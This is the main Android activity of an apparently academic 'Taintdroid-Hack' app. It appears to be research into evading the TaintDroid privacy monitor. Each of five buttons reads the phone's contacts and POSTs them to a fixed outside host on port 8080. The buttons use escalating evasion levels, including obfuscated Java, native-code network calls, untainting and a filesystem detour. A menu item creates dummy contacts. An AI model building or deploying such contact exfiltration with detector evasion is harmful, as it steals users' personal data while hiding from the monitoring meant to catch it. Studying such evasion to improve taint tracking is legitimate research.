package de.uni_passau.taintdroid_hack;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;

import de.uni_passau.taintdroid_hack.tasks.CreateContactsTask;
import de.uni_passau.taintdroid_hack.tasks.PostTask;
import de.uni_passau.taintdroid_hack.util.ContactsUtil;
import de.uni_passau.taintdroid_hack.util.SecurityLevel;

import static de.uni_passau.taintdroid_hack.Constants.HOST_IP;

/**
 * The main Activity of the Taintdroid-Hack application.
 */
public class MainActivity extends AppCompatActivity {

    private String filesDir;
    private ProgressBar progressBar;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        filesDir = this.getFilesDir().getAbsolutePath();

        progressBar = findViewById(R.id.progressBar);

        final Button normal = findViewById(R.id.hack1);
        normal.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PostTask httpR = new PostTask(getApplicationContext(), HOST_IP, 8080,
                        SecurityLevel.REGULAR);
                httpR.execute(ContactsUtil.getContactsAsString(getContentResolver()));
            }
        });

        final Button secure_java = findViewById(R.id.hack2);
        secure_java.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PostTask httpd = new PostTask(getApplicationContext(), HOST_IP, 8080,
                        SecurityLevel.OBFUSCATED_JAVA);
                httpd.execute(ContactsUtil.getContactsAsString(getContentResolver()));
            }
        });

        final Button secure_cpp = findViewById(R.id.hack3);
        secure_cpp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PostTask httpd = new PostTask(getApplicationContext(), HOST_IP, 8080,
                        SecurityLevel.OBFUSCATED_NATIVE_NETWORK);
                httpd.execute(ContactsUtil.getContactsAsString(getContentResolver()));
            }
        });

        final Button secure_cpp_untint = findViewById(R.id.hack4);
        secure_cpp_untint.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PostTask httpd = new PostTask(getApplicationContext(), HOST_IP, 8080,
                        SecurityLevel.OBFUSCATED_NATIVE_UNTAINT);
                httpd.execute(ContactsUtil.getContactsAsString(getContentResolver()));
            }
        });

        final Button secure_cpp_filesystem = findViewById(R.id.hack5);
        secure_cpp_filesystem.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PostTask httpd = new PostTask(getApplicationContext(), HOST_IP, 8080, filesDir,
                        SecurityLevel.OBFUSCATED_NATIVE_FILESYSTEM);
                httpd.execute(ContactsUtil.getContactsAsString(getContentResolver()));
            }
        });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        if (id == R.id.action_create_contacts) {
            new CreateContactsTask(getContentResolver(), progressBar).execute();
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
